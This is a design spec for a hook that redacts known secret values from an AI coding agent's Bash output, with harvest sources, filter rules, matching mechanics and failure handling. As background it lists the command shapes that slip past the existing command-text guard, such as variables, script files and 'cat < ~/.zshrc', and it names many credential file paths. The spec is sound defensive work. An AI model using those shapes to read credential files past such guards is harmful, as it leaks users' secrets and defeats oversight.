---
phase: implementation
model_tier: high
branch: feat/output-secret-redaction
---

# Output secret redaction — blank known secret values out of what a command printed

## Why

Two real credentials leaked out of `~/.terminal_aliases` into a session transcript on
2026-08-27. `secret-command-guard.sh` shipped in response, and it works — but it judges
the **text of a command**, never what came back. Every one of the eight shapes in that
card's Known-gaps table is the same defect wearing a different hat: put the read inside a
script file, behind a variable, behind a glob, or in a file not named `.env`, and the
classifier has nothing to match on. Widening the pattern list cannot close a gap whose
root cause is that the guard is looking at the wrong artefact.

This card looks at the other artefact. A `PostToolUse` hook receives the command's output
and can replace it before the model ever reads it. That closes the shapes whose defect is
*how the file was reached* — script file, variable, glob, `$(…)` — because output redaction
does not care about the route. It does **not** close the two whose defect is *which file*:
`cat foo.zshrc` / `cat my.env` and `cat config/prod.env` name files that are absent from the
Sources table below, so a known-values design never harvests them either. **Six of eight, not
eight**; the Known-gaps table records the remainder. (That table had seven rows when this was
written. An eighth was measured on 2026-08-30 — an INPUT REDIRECTION, `cat < ~/.zshrc`, which
lexes to `argv ['cat']` and is allowed. It is a route defect like the script-file row, so
output redaction should close it too, which is why the count moved five-of-seven to
six-of-eight rather than five-of-eight. That reading carries the same caveat as the original,
recorded under Not verified: it is a reading of the sibling card's table, not a measurement.)

**The premise that said this was impossible is false. It is written in three places, and a
fourth site rests on a separate objection that is also obsolete.**
`docs/features/secret-command-guard.md:20-23` claims "a `PostToolUse` hook cannot
retroactively redact output already returned to the model", citing a survey of this repo's
own two `PostToolUse` hooks. The observation was right — both only ever add context — but
the inference generalised two local hooks to the whole platform. Measured false on CLI
2.1.251 (evidence in Verification below). The same claim is repeated verbatim at
`docs/decisions/0039-…:24-26` and `hooks/secret-command-guard.sh:10-15` — three sites for one
premise. Separately, `docs/features/secret-command-guard.md:78-79` rejects output scanning on
different grounds ("a pipe wrapper risks swallowing exit codes"), which is equally obsolete
here for its own reason: a `PostToolUse` rewrite is not a pipe wrapper and touches no exit
code. Four edits, three of them the same sentence.

## Shape

```mermaid
flowchart TD
    A[Model issues a Bash command] --> B{PreToolUse<br/>secret-command-guard.sh}
    B -->|blocks a named secret path<br/>in the command TEXT| X[Refused, nothing runs]
    B -->|allows| C[Command runs]
    C --> D[tool_response<br/>stdout / stderr]
    D --> E{PostToolUse<br/>output-secret-redaction.sh}
    E -->|harvest known values<br/>scan, blank exact matches| F[updatedToolOutput]
    F --> G[Model reads redacted text]
    F --> H[Transcript JSONL stores<br/>the redacted text]
    C -.command text persists verbatim.-> H
```

The dotted edge is the boundary between the two layers: this hook never touches the
command text, and the existing guard never touches the output. Neither replaces the other.

## Scope

1. **A new `PostToolUse` hook on matcher `Bash`**, `hooks/output-secret-redaction.sh`, with
   its classifier logic in `hooks/lib/redact-known-secrets.py`, matching the wrapper +
   python-lib split the sibling guard already uses.
2. **Harvest** the real secret values from an explicit list of files (below), per
   invocation, with no cache.
3. **Filter** harvested values so only plausible credentials become redaction targets.
4. **Scan** `stdout` and `stderr` for exact occurrences and replace them with a named
   placeholder.
5. **Emit** `hookSpecificOutput.updatedToolOutput` containing a mutated copy of the received
   `tool_response`.
6. **Honour `SECRET_EXEMPT`**, read from the command text exactly as the sibling guard reads
   it; on exemption emit nothing at all. See Decisions taken.
7. **Correct the false premise** in the three sites that state it, plus the fourth site whose
   separate objection is also obsolete — one commit, with this card as the single authority
   the other three point at.

### Pinned versions

| Thing | Version | Why pinned |
| --- | --- | --- |
| Claude Code CLI | `2.1.251` | every platform behaviour below was measured against this build **and only this build** — `2.1.245` and `2.1.246` are also present on disk and were not tested. `updatedToolOutput` is not documented publicly and its contract may move, so the corrections in Task 9 must be version-scoped rather than stated absolutely |
| python3 | `3.9.6` (macOS system, `/usr/bin/python3`) | the sibling guard resolves `python3` then `python` from PATH; 3.9 is the floor — no `match`, no `str.removeprefix` in hot paths |
| `jq` | `1.7.1-apple` | used by the registration self-test, per house convention |
| No third-party libraries | — | the hook runs on every Bash call; an import outside the stdlib is a supply-chain surface and a startup cost |

**No `sqlite3` binary dependency.** An earlier revision pinned `/usr/bin/sqlite3` 3.51.0 and
built a degraded-coverage failure path around its absence. That was unnecessary: the already-
pinned python3 3.9.6 ships the stdlib `sqlite3` module linked against the **same SQLite
3.51.0**, and the read-only URI open this design needs works —
`sqlite3.connect("file:…?mode=ro&immutable=1", uri=True)` was measured returning rows. The
binary, its version pin, and the "binary unavailable" skip condition are all removed rather
than kept as a dependency that cannot fail.

## Contracts

### Input — the `PostToolUse` payload

```yaml
session_id: string
transcript_path: string
cwd: string
hook_event_name: "PostToolUse"
tool_name: "Bash"
tool_input:
  command: string          # NOT redactable by this hook; see Known gaps
  description: string
tool_response:
  stdout: string           # truncated to 30000 chars BEFORE the hook sees it
  stderr: string
  interrupted: boolean
  isImage: boolean
  noOutputExpected: boolean
  # optional, present only in some cases — see the mutate-a-copy rule
  returnCodeInterpretation: string
  persistedOutputPath: string
  persistedOutputSize: number
  backgroundTaskId: string
  backgroundedByUser: boolean
tool_use_id: string
duration_ms: number
```

### Output — the replacement envelope

```json
{
  "hookSpecificOutput": {
    "hookEventName": "PostToolUse",
    "updatedToolOutput": { "...": "a mutated COPY of the received tool_response" }
  }
}
```

**The single most important implementation rule.** Build the replacement by copying the
received `tool_response` dict and overwriting `stdout`/`stderr` on the copy. Never construct
a fresh object from a fixed field list. Two independent readings of the field set disagree
(five fields observed from a simple `echo`, nine in the binary's schema), and the harness
validates the replacement against the Bash tool's `outputSchema`; **on mismatch it logs and
silently uses the original output**, which for a redaction hook means the secret ships.
Mutating a copy is correct under both readings.

### Placeholder format

`[REDACTED:<LABEL>]` — e.g. `[REDACTED:GITHUB_TOKEN]`.

`<LABEL>` is `[A-Z0-9_]+`, uppercased, with any other character replaced by `_`. Where a
harvested value has a key name, the label **is** that key name. Many mandated sources are
keyless, so each gets a fixed symbolic label — never a filename or path, which would leak
the source location (and, for the gcloud path, an email address):

| Source | Label |
| --- | --- |
| `~/.ssh/id_*` (PEM body) | `SSH_PRIVATE_KEY` |
| `~/.vault-token`, `*.token` | `VAULT_TOKEN`, `SERVICE_TOKEN` |
| `~/.pgpass` field 5 | `PGPASS_PASSWORD` |
| `~/.netrc` / `~/.authinfo` password token | `NETRC_PASSWORD` |
| `~/.git-credentials` line, and its URL password component | `GIT_CREDENTIAL` |
| a URL password slot inside any keyed value | the enclosing key name, suffixed `_URL_PASSWORD` |
| a base64-decoded `auths.*.auth` from `~/.docker/config.json` | `DOCKER_REGISTRY_AUTH` |
| anything else keyless | `UNNAMED_SECRET` |

Two labels colliding is harmless; a label revealing where the value lives is not.

Named, not opaque. An opaque `[REDACTED]` produces exactly the undiagnosable failure this
work exists to avoid: the model cannot tell a redaction from a broken command and retries in
a loop. The key name is a small disclosure (it confirms such a credential exists locally, in
a transcript that is already local) and is worth the diagnosability. **Emit the key name
only — never the value, never a prefix, and never a length hint**, because a length hint
measurably narrows a brute-force space.

## Sources to harvest

An **explicit list, never filesystem discovery.** A `find` over `$HOME` at depth 4 for
`.env` files did not complete in two minutes and was killed; discovery is not viable inside
a hook that runs on every command.

| Group | Members |
| --- | --- |
| zsh | `~/.zshenv`, `~/.zprofile`, `~/.zshrc`, `~/.zlogin`, `~/.zlogout` (honour `$ZDOTDIR`) |
| bash | `~/.bash_profile`, `~/.bash_login`, `~/.profile`, `~/.bashrc`, `~/.bash_aliases`, `~/.bash_logout` |
| sourced fragments | every file reachable by a `source`/`.` directive from the above — **required, not optional**: `~/.terminal_aliases` is in no shell's native load order, so a harvester that skips chain-following misses the file that actually leaked |
| env | `.env`, `.env.local`, `.env.<stage>` (incl. `.env.test`, `.env.ci`), `.envrc` |
| INI/other | `~/.aws/credentials`, `~/.netrc`, `~/.pgpass`, `~/.npmrc`, `~/.my.cnf`, `~/.pypirc`, `~/.git-credentials` |
| YAML/TOML/XML | `~/.config/gh/hosts.yml`, `~/.kube/config`, `~/.gem/credentials`, `~/.bundle/config`, `~/.cargo/credentials.toml`, `~/.m2/settings.xml` |
| JSON | `~/.docker/config.json`, `~/.claude.json`, `~/.config/gcloud/legacy_credentials/*/adc.json`, `~/.aws/sso/cache/*.json`, `*/Application Support/*/credentials*.json` |
| whole-file secrets | `~/.ssh/id_*` (excluding `*.pub`), `~/.vault-token`, `*.token` |
| SQLite | `~/.config/gcloud/credentials.db` (table `credentials`, column `value` — a JSON blob), `~/.config/gcloud/access_tokens.db` (table `access_tokens`, column `access_token`) |

**Excluded, and the reason matters.** `.env.example`, `.env.template`, `.env.sample`,
`.env.dist`, `.env.defaults`, `.env.schema`, `.env.vault` are excluded **as a
false-positive control, not a secrecy control** — they hold placeholders like `changeme`
and `your-api-key-here`, and harvesting those would blank those literals out of all command
output forever. Also never harvested: `~/.ssh/*.pub`, `~/.ssh/known_hosts*`,
`~/.docker/daemon.json`, `/etc/paths` and `/etc/paths.d/*` (PATH fragments — harvesting them
blanks directory names out of every command), and all Apple-shipped `/etc/*`.

**Format traps** that a naive implementation gets wrong: `.npmrc` is INI, not JSON;
`~/.kube/config` and `~/.config/gh/hosts.yml` are YAML, not JSON; `~/.pgpass` is
colon-positional (the secret is field 5); gcloud's `credentials.db` and `access_tokens.db`
are **SQLite**, where a line-oriented parser produces short binary garbage — the worst
possible candidate values. Read them through python's stdlib `sqlite3` module with
`mode=ro&immutable=1`, or not at all; never with a text parser.

**Never log a scanned path.** `~/.config/gcloud/legacy_credentials/<google-account>/adc.json`
embeds an email address in its directory name; a hook that logs which files it read writes
that address into its log. Log counts and hashes, not paths.

## The filter

Harvesting every value from every profile and config would collect `true`, `8080`,
`localhost`, `main`, and the username, and then blank those words out of all output — a
failure that is far more disruptive, and far harder to diagnose, than the leak it prevents.

**Entropy cannot be the filter, and this is measured rather than argued.** Shannon entropy
over a string's own characters measures repetition, not unpredictability, and is capped at
log₂(length):

| Value | Entropy (bits/char) | Actually |
| --- | --- | --- |
| 64-char hex token | 3.82 (mean of 500 sha256 digests; min 3.54, max 3.96) | a real secret |
| `s3cr3t` | 2.25 | a real secret |
| `localhost` | 2.73 | innocent |
| a real URL (35 chars) | 4.08 | innocent |

Secrets span **2.25–3.82**; innocent values span **2.73–4.08**. The two ranges overlap
across [2.73, 3.82], so no single threshold separates them: any cut high enough to exclude
`localhost` also excludes `s3cr3t`, and any cut low enough to keep the hex token also keeps
the URL. The overlap alone settles it; no sweep is needed, and none is quoted.

⚠️ **Correction record, left visible on purpose.** An earlier revision of this table
(`9208751`) recorded the hex token at **2.43**. That single figure was wrong: hex uses a
16-symbol alphabet, so entropy is capped at log₂(16) = 4.0 and a random hex string lands just
under it. Re-measured at **3.82** (`docs/features/evidence/output-secret-redaction/ent.py`) after the compliance judge flagged
it. Two things this correction does *not* claim: the earlier revision's surrounding sentence
("the lowest real secret scores below the highest innocent value") was **correct** and is
still true under the new numbers; and an intermediate revision of this paragraph asserted that
`9208751` argued "hex has only 16 symbols", which `git show` disproves. **That intermediate
revision then guessed at where the phrase came from, and guessed wrong a second time.** No
attribution is offered here: the measurements are `docs/features/evidence/output-secret-redaction/ent.py`, the blob is
`9208751`, and where the erroneous sentence originated is not established and is not worth
another guess. An earlier threshold sweep ("9/19", "19/23") was also removed — it cannot have
come from the 41-entry corpus described below (17 secrets, 24 innocent) and no other corpus
was ever specified. Use a **character-class count** (how many of
lower/upper/digit/other appear) instead — cheap, and it does not pretend to measure
randomness.

### The rule

A harvested value becomes a redaction target when **either** arm fires, and the denylist
overrides both.

- **Strong evidence** — the key name matches the credential pattern, **or** the value sits
  in a URL password slot → minimum length **6**, no character-class test.
- **Weak evidence** — no key match → minimum length **24** **and** at least 2 character
  classes.

Key pattern, case-insensitive:
`TOKEN | SECRET | PASSW(OR)?D | _PW\b | PASS\b | CREDENTIAL | PRIVATE | APIKEY | API_?KEY |
ACCESS_KEY | AUTH | SESSION | SIGNING | CLIENT_SECRET | DSN | _PAT\b | PAT_ | SALT | CERT |
LICENSE | WEBHOOK`

Measured on a 41-entry corpus:

**Every row below is in-sample.** All five were scored on the same 41-entry corpus the
winning rule was tuned against, so the table ranks the candidates but predicts nothing about
unseen input.

| Rule | Secrets caught (in-sample) | Innocent wrongly blanked (in-sample) |
| --- | --- | --- |
| key name only | 15/17 | 3/24 |
| length floor only | 14/17 | 7/24 |
| AND | 12/17 | 1/24 |
| OR, symmetric thresholds | 17/17 | 9/24 |
| **OR, asymmetric (this rule)** | **17/17 — fitted** | **0/24 — fitted** |

AND is disqualified by two shapes it structurally cannot see: `MY_THING=ghp_…` (a real
token under an innocent key name) and `DB_PASSWORD=hunter2` (7 characters, below any useful
floor). Symmetric OR is disqualified by 9 false blanks.

⚠️ **17/17 · 0/24 is a fitted number.** The rule was tuned on the corpus it is scored
against, so it is not a generalization estimate. Re-measuring against a held-out corpus is a
task below, not an optional extra.

### Two rules the measurements forced

1. **Decompose URLs; never harvest one whole.**
   `DATABASE_URL=postgres://user:hunter2@localhost:5432/db` must yield `hunter2`, not the
   URL. Harvesting the URL blanks every log line that names your database host. The password
   slot counts as positional evidence equal to a key-name match — without that, `hunter2`
   falls to the 24-character floor and is missed.
2. **"contains a slash → it is a path" is wrong.** That test drops
   `AWS_SECRET_ACCESS_KEY`, because AWS secret keys are base64 and legitimately contain `/`.
   Anchor the path test at the start: `^(/|~/|\./|\$)`.

### Denylist — never blanked, whatever the key says

Exact set `{true, false, yes, no, on, off, null, none, default, localhost, 127.0.0.1,
0.0.0.0, ::1, main, master, develop, head, development, production, staging, test, debug,
info, warn, error}`, plus the username, repo name, hostname, and current branch names;
anything starting `/ ~ ./ ../ $ -`; and all-digit values.

**Weak arm only, additionally:** single dictionary words from `/usr/share/dict/words`
(218,004 entries ≥6 chars), and — critically — `^[0-9a-f]{7,}$`, UUIDs, and `sha256:`
digests. Blanking a pinned git SHA corrupts every subsequent `git log`, which is precisely
the maddening failure mode this filter exists to prevent. Adding those three shapes fixed 4
of 5 such false blanks with zero new misses.

## Runtime

**Re-read and re-parse every invocation. No cache, no daemon, no hashes.** The premise that
parsing is too slow is false, and not narrowly:

| Operation | Measured |
| --- | --- |
| `python3 -c pass` | 16 ms |
| `python3 -c 'import json,re,os,sys'` | 22 ms |
| **read + parse the real corpus** (3 files, 21,846 bytes, 58 assignments) | **0.16 ms** |
| parse 200 KB synthetic shell corpus | 1.24 ms |
| parse 1 MB synthetic shell corpus | 6.35 ms |
| in-hook total, ~~40-needle scan~~ | ~~≈ 0.25 ms~~ — **superseded**, see Matching mechanics: the nine-needle expansion puts the worst case at ~17 ms |

Harvesting costs 0.7% of the interpreter startup already being paid. Every caching option
therefore trades a measurable security regression for an unmeasurable speedup:

- **Plaintext cache at 0600** — concentrates every credential on the machine into one file,
  in one format, at a predictable path. Today an attacker must find and parse N scattered
  files; afterwards they read one. Rejected: it makes the thing this hook prevents *easier*,
  to save 0.16 ms.
- **Salted hashes + lengths** — structurally impossible, not merely slow. You cannot
  substring-search for a value you hold only a hash of; you must hash every window of every
  candidate length. For 100 KB of output across 22 realistic credential lengths that is
  2,251,931 windows: **556 ms** (sha256), 678 ms (blake2b), 2,402 ms (HMAC), against
  **~17 ms** for the mandated scan — **~33× slower**. (An earlier revision divided by the
  superseded 0.45 ms single-pass figure and reported ~1,200×; the decision is unchanged —
  hashing is rejected on unconfirmability as much as on cost — but the ratio was stale.)
  A Rabin-Karp rolling hash restores
  O(1) per window only for an *unkeyed* polynomial hash, which is brute-forceable and defeats
  the reason for hashing. And a hash hit is unconfirmable: holding no value, a collision
  forces redacting innocent output with no way to check.
- **mtime-keyed cache** — the only defensible cache, but it still writes plaintext to disk
  and adds a real bug class: editors and `direnv` commonly rewrite `.env` files with the
  *same* mtime, so a stale cache silently stops redacting a **rotated** secret.
- **Daemon** — memory-only is better hygiene, but it adds a lifecycle, an IPC surface
  readable by any local process, and a liveness failure that fails open. Disproportionate to
  a 0.16 ms problem.

**Growth is bounded by a budget, not a cache**, with three named constants:

| Constant | Value | Why this value |
| --- | --- | --- |
| `MAX_TOTAL_BYTES` | 2 MB | ~95× the measured real corpus (21,846 bytes); at 1 MB parsing still costs 6.35 ms, so 2 MB stays inside one interpreter startup |
| `MAX_FILE_BYTES` | 256 KB | `~/.claude.json` is 92,847 bytes — the largest real source — so 256 KB clears it with headroom while excluding runaway logs |
| `MAX_SOURCE_DEPTH` | 8 | `~/.zshrc` → oh-my-zsh → `lib/*.zsh` → a custom fragment is 4 levels; 8 doubles it. Enforced together with a visited-inode set, since dotfile repos contain `source` cycles |

On exceeding `MAX_TOTAL_BYTES` the harvester stops reading further sources and proceeds with
what it has — it does **not** abort, because an abort would mean no redaction at all.

## Matching mechanics

- **Exact substring, case-sensitive, on raw bytes**, plus a defined set of encoded forms.
  Exact matching already survives shell quoting and JSON escaping for free. Hex is skipped as
  rare for credential echo. **Never case-fold** — folding breaks base64 matching, where case
  is data, and blanks far more innocent text.

  "base64" is not one string, and leaving it unspecified is a silent coverage hole. Generate:

  | Needle | Form |
  | --- | --- |
  | 1 | the raw value |
  | 2–4 | RFC 4648 **standard** alphabet (`+/`), at byte offsets 0, 1 and 2 — a value embedded mid-stream encodes differently per alignment, and only one of three would otherwise match |
  | 5–7 | RFC 4648 **url-safe** alphabet (`-_`), same three offsets |
  | 8 | standard alphabet, **unpadded** (trailing `=` stripped) |
  | 9 | `%`-encoding per RFC 3986, encoding every character outside `A-Za-z0-9-._~` |

  **The trim rule, stated as arithmetic rather than prose — this is the part that is easy to
  get wrong, and the first attempt was wrong.** For a value `v` at byte offset
  `r = k mod 3`, encode `(r filler bytes) + v`, strip padding, then keep

  ```
  lead = ceil(8 * r / 6)                      # 0, 2, 3 for r = 0, 1, 2
  full = (8 * (r + len(v)) - 6 * lead) // 6   # whole 6-bit chars fully determined by v
  needle = encoded[lead : lead + full]
  ```

  Dropping the leading `lead` characters removes every character contaminated by the
  preceding bytes; taking only `full` characters drops the trailing partial group, which is
  contaminated by whatever follows. **Measured over 2,100 embeddings — 350 trials per offset
  per rule, 3 offsets, 2 rules, so 1,050 per rule** (`v` 24–48 bytes, random prefix and
  suffix):

  | Rule | offset 0 | offset 1 | offset 2 | total |
  | --- | --- | --- | --- | --- |
  | "drop first and last character" (the first attempt) | 171/350 | 41/350 | **0/350** | 212/1050 |
  | **the arithmetic above** | 350/350 | 350/350 | 350/350 | **1050/1050** |

  Script: `docs/features/evidence/output-secret-redaction/b64.py`, seeded with `random.Random(7)` and reset per cell, so these
  counts reproduce exactly on re-run — an earlier version of the script drew from
  `os.urandom` and its per-cell counts drifted every execution while appearing to be fixed
  measurements. The failed rule is recorded because it *looked* correct and silently produced
  a needle that could never match at offset 2.

  If a needle falls below the partial-match floor after trimming, it is still emitted — it is
  simply matched only in full, per the floor rule below.
- **Two different floors, and they are not in conflict — but only if this is read exactly.**
  The strong arm's **6** is a *harvest* floor: it decides whether a value becomes a needle at
  all. The **20** here is a *partial-match* floor: it decides whether a needle may match a
  fragment. They compose as one rule:

  | Needle length | How it may match |
  | --- | --- |
  | < 20 characters | **whole-needle only** — the complete value must appear contiguously |
  | ≥ 20 characters | whole needle, **or** any ≥20-character contiguous substring of it |

  So `DB_PASSWORD=hunter2` (7 chars, harvested by the strong arm) is redacted wherever
  `hunter2` appears in full, and never on a fragment. Partial matching covers line wrapping
  and mid-truncation for long needles without opening the short-needle false-blank rate that
  the table below measures.
  False-blank rates at 2,000 Bash calls/day and ~102,400 windows per scan:

  | Match length | with a 4-char vendor prefix (`ghp_`) | with a 13-char prefix (`sk-ant-api03-`) |
  | --- | --- | --- |
  | 8 | **13.9 false blanks/day** | ~2×10⁸/day |
  | 12 | 9.4×10⁻⁷/day | ~2×10⁸/day |
  | 16 | negligible | 859/day |
  | 20 | negligible | 5.8×10⁻⁵/day |

  The honest consequence: **the first-8-characters form that many tools print cannot be
  caught safely** — a 4-character vendor prefix leaves only 4 random characters. Truncated
  tokens go unredacted, and the spec says so rather than implying coverage.
- **Scan `stdout` and `stderr`, always.** Credentials surface in stderr at least as often as
  stdout, because auth failures echo the token back.
- **`isImage: true` → return the output unmodified.** The payload is base64 image data; a
  spurious match would corrupt the image.
- **Redact longest needle first**, so an overlapping short value cannot blank half a longer
  one.
- **The partial-match algorithm, specified — not left to the implementer.** "Any ≥20-char
  contiguous substring" is a *semantics*; read literally it is unimplementable at this budget.
  Measured at 100 KB of output with 40 secrets × 9 needles = **360 needles**
  (`docs/features/evidence/output-secret-redaction/scan.py`, seeded, worst case):

  The **inputs** are seeded and reproduce exactly; the **timings** are wall-clock and vary
  run to run, so they are quoted to whole milliseconds across five runs on this machine
  (2026-08-28). Treat the ratio as the finding, not the absolute figures — an independent run
  measured 15–17 ms for the middle row.

  | Strategy | Work | Cost (5 runs) |
  | --- | --- | --- |
  | enumerate every 20-char substring, `str.replace` each | 5,992 replace passes | **~113 ms** (112–117) — rejected |
  | **20-gram index, one pass over the output** | 5,992-entry index, output scanned once | **~16 ms** (15–17) |
  | short needles (<20 chars), whole-needle `str.replace` | 40 passes | **~1 ms** |

  **The mandated algorithm:**
  1. Needles **< 20 chars** → `str.replace` in a loop, longest first. `str.replace` is a tight
     C `memmem`; re-measured on the tracked script (rows D and E, mean of 5 runs, 100 KB, 40
     needles) a compiled 40-branch alternation costs **~5.2 ms** against **~1.0 ms** for the
     loop, so do not reach for a regex here. The superseded `3.31 / 0.45 ms` pair from an
     untracked earlier measurement is retired everywhere. **The ratio moved too and the
     direction is all that survived:** the old pair is 7.4×, the new one 5.2× — a 40%
     difference, so do not read the two measurements as agreeing.
  2. Needles **≥ 20 chars** → build an index of every 20-character substring, then slide one
     20-character window over the text a single time. Cost is O(output + Σ needle lengths) and
     **does not grow with needle count**, which is what makes the 360-needle case affordable.

     **One 20-gram routinely belongs to several needles, so "the owning needle" does not
     denote and a plain `dict` silently drops owners.** Measured over 300 random values
     (`docs/features/evidence/output-secret-redaction/grams.py`, seeded): **300 of 300**
     produced at least one 20-gram shared by two or more of that value's own nine needles, and
     **28.0% of all grams (17,812 of 63,552)** had multiple owners; the first example shared 72
     of 346. The cause is structural, not incidental — needle 8 is needle 2 with padding
     stripped, so one contains the other as a prefix, and the standard and url-safe alphabets
     are identical on any run free of `+/-_`. The index is therefore
     `gram → list of (needle, label)`, and a hit resolves as:

     1. For each candidate needle, extend the match left and right as far as the text and that
        needle agree.
     2. Keep the **longest** extension. Ties break toward the needle registered first, which is
        deterministic because needles are built in the fixed order of the table above.
     3. Replace that span with the winning needle's label.
     4. Resume scanning at the end of the replaced span — not one character on — so an
        overlapping second match cannot re-enter the middle of a span already redacted.

     Because every needle of one secret carries that secret's label, ties between needles of
     the *same* secret cannot pick a wrong label; only a gram shared across two *different*
     secrets could, and the longest-extension rule resolves that to whichever value actually
     continues in the text.

- **Honest revision of the runtime budget.** The "≈ 0.25 ms in-hook total" in the Runtime
  table above was computed against a **40-needle** scan; the nine-needle expansion makes the
  worst case 360 needles, and the measured scan is **~17 ms** (≈16 + ≈1), not 0.25 ms.
  Against a 16–22 ms interpreter startup that roughly doubles the hook's cost on a 100 KB
  output. It remains well inside the 30,000-character ceiling the harness imposes, and the
  360-needle figure is a worst case — but the earlier number is superseded and the Runtime
  table is annotated accordingly rather than left to be quoted.

## Failure direction

**This is only half ours to choose, and the spec must not claim otherwise.** There is no
"abort the tool result" signal at `PostToolUse`. Measured — the canary reached the model in
every failure case:

| Hook behaviour | Canary leaked? |
| --- | --- |
| correct envelope | no — redacted |
| crash (exit 1) | **yes** |
| malformed JSON on stdout | **yes** |
| `updatedToolOutput` carrying only `stdout` | **yes** |
| `updatedToolOutput` as a bare string | **yes** |
| exit code 2 | **yes** |

**Fail closed by construction, inside the band we control.** Wrap the entire hook body in a
catch-all that, on any internal exception, emits a **well-formed envelope with every field
present** whose `stdout`/`stderr` read `[redaction hook failed — output withheld]`. That
turns an internal error from a silent leak into a visible, self-describing blank.

**But the catch-all must not sit over the whole harvest, or one bad file blanks everything.**
The Sources table names ~40 files in nine formats, most of them third-party and none of them
under this hook's control. Under a single outer catch-all, one malformed `~/.kube/config` —
or an `.env` mid-write, or a truncated JSON config — would raise once and then blank **every
Bash output in every session** until someone noticed. That is a worse outage than the leak.

Two error boundaries, not one:

| Stage | On error | Why |
| --- | --- | --- |
| **Per source file** (open, read, parse) | skip that source, continue — and see the counting rule below for whether it is *counted* | a third-party file we do not control must never be able to disable the session |
| **Scan and emit** (filter, needle build, replace, serialise) | withheld-output envelope | this is our own code operating on a payload we *know* may contain a secret; failing open here is exactly the leak |

**Emit-or-not is decided by two independent conditions, not one.** An earlier revision said
"zero harvested values ⇒ emit no replacement", which contradicted the degraded-harvest notice
below: in the one case the notice exists for, there would have been no envelope to carry it.
The rule is:

**Two conditions short-circuit this table before any row is evaluated: a valid
`SECRET_EXEMPT` on the command, and `isImage: true`.** In either case the hook emits nothing —
no redaction, no notice line. The exemption is checked first, because it is the user's
explicit instruction and it makes the rest of the work unnecessary.

**`isImage: true` short-circuits this table too.** The hook returns no
replacement at all — no redaction, and **no notice line**, because appending text to base64
image data corrupts the image, and a corrupted image is a worse outcome than an unreported
degraded harvest. This precedence is absolute and is the first thing the hook checks.

Otherwise:

| Redactions made | Sources skipped | Hook emits |
| --- | --- | --- |
| none | none | **nothing** — no envelope; output passes through untouched |
| none | ≥ 1 | **an envelope** carrying the unmodified streams **plus the notice line** |
| ≥ 1 | none | an envelope with the redacted streams |
| ≥ 1 | ≥ 1 | an envelope with the redacted streams **plus the notice line** |

So a machine with no secrets stays silent and costs nothing, while a machine whose harvest
degraded says so — the two states are no longer indistinguishable, which was the defect.

**This was the quietest failure in the design, and the fix must not rely on stderr.** A hook that
exits 0 has no guaranteed-visible channel — this repo's own
`docs/features/global-option-blindness.md:594` records stderr visibility for a zero-exit hook
as unverified. So the notice goes **in band**: whenever one or more sources were skipped, the
hook appends a single line to `stdout` via the same `updatedToolOutput` it already emits —

```
[redaction: N of M sources unreadable — coverage degraded]
```

**What counts as "skipped" — and what emphatically does not.** The Sources table lists ~40
paths, and the Verification plan records that **most of them are absent on any given machine**.
If absence counted as a skip, this notice would append to the output of every Bash command in
every session, forever — which is the same "maddening to diagnose" corruption the filter design
goes to such lengths to avoid.

| Condition | Counted in `N`? | Counted in `M`? |
| --- | --- | --- |
| the path does not exist | no — expected, the normal case for most of the list | no |
| the path is a broken symlink | no — treated as absent | no |
| the file exists but cannot be opened (permissions) | **yes** | yes |
| the file opens but the parser raises | **yes** | yes |
| the file exceeds `MAX_FILE_BYTES` | **yes** | yes |
| the total budget `MAX_TOTAL_BYTES` is spent before this source is reached | **yes** | yes |
| a `source`-chain file is unreachable because `MAX_SOURCE_DEPTH` is exhausted | **yes** | yes |

**`M` counts every source in the `N` column's "yes" rows plus every source read successfully**
— i.e. everything attempted. An earlier revision defined `M` as "present and attempted" while
counting budget-exhausted sources (never opened, so never *present* under that wording) in
`N`, which permitted a notice reading `5 of 3`. Both columns now derive from the same set.

**`MAX_SOURCE_DEPTH` exhaustion is counted deliberately, and it is not hypothetical:**
`~/.terminal_aliases` — the file that leaked twice — is reachable *only* through a `source`
chain. A depth cut-off that silently dropped it would reproduce the original incident while
the hook reported success.

**One rule that was hiding in this table and does not belong here.** An earlier revision
listed "resolves outside `$HOME`" as a not-counted condition. That is a *harvest-scope* rule,
not a counting rule, and as written it silently dropped the entire cwd-relative `.env` group
for any repository living outside `$HOME`. Scope is defined once, in Sources: `~`-rooted
entries resolve against `$HOME`; the `.env` group resolves against the **command's `cwd`**
wherever that is. Neither is filtered by location, and a path that resolves outside both is
simply not on the list and so never attempted.

— which the model reads like any other output and can surface. This is the one case where the
hook emits an envelope for output it did not redact, and row 2 of the table above is what
makes that possible. The residual risk is recorded in Known gaps: the notice is unverified —
not measured end to end — and if the harness rejects the envelope for any reason the notice is
lost along with the redaction.

Outside that band — `python3` missing, hook timeout, process killed, the harness's own
schema rejection — the platform falls back to the original output and the secret is printed.
Nothing the hook can do changes that.

**Why fail-closed here and fail-open in the sibling.** `secret-command-guard.sh` fails open
because it sits at `PreToolUse` on nearly every Bash call, where a fail-closed bug is a
shell ban. Here the command has already run and its side effects have landed; only the text
is withheld, and a re-run recovers it. A bug in this redactor is loud and quickly diagnosed
— much the better failure than a silent leak.

## Scenarios

```gherkin
Feature: Redact known secret values from Bash output

  Scenario: The original incident shape, reached through a script file
    Given ~/.terminal_aliases assigns API_TOKEN a 40-character value
    When a command runs "bash diag.sh" and that script prints the environment
    Then the model receives "[REDACTED:API_TOKEN]" in place of the value
    And the transcript JSONL stores the redacted text, not the value

  Scenario: The value is reached through a variable, defeating the PreToolUse guard
    Given ~/.zshrc assigns GH_PAT a 40-character value
    When a command runs 'F=~/.zshrc; cat "$F"'
    Then the value is replaced by "[REDACTED:GH_PAT]"

  Scenario: A secret in stderr
    Given a harvested value V under the key AWS_SECRET_ACCESS_KEY
    When a command fails and writes V to stderr
    Then stderr is scanned and V is replaced

  Scenario: A base64-encoded occurrence
    Given a harvested value V
    When output contains base64(V) rather than V
    Then base64(V) is replaced

  # Bad-path and edge scenarios

  Scenario: A pinned git SHA is not blanked
    Given a harvested weak-evidence value that is a 40-character hex string
    When "git log --oneline" prints commit SHAs
    Then no SHA is replaced
    And the weak-arm hex denylist is the assertion that fires

  Scenario: A placeholder from .env.example is never harvested
    Given .env.example contains API_KEY=your-api-key-here
    When any command prints the words "your-api-key-here"
    Then the text is unchanged
    And .env.example contributed no needle to the scan

  Scenario: A short innocent value under a secret-sounding key is still blanked
    Given a shell profile assigns AUTH_MODE the value "oauth2"
    When a command prints "oauth2"
    Then it IS replaced, because the strong arm has a floor of 6 and no class test
    # This is an accepted false positive, recorded here rather than hidden

  Scenario: The hook crashes internally
    Given the classifier raises an unexpected exception
    When the hook runs
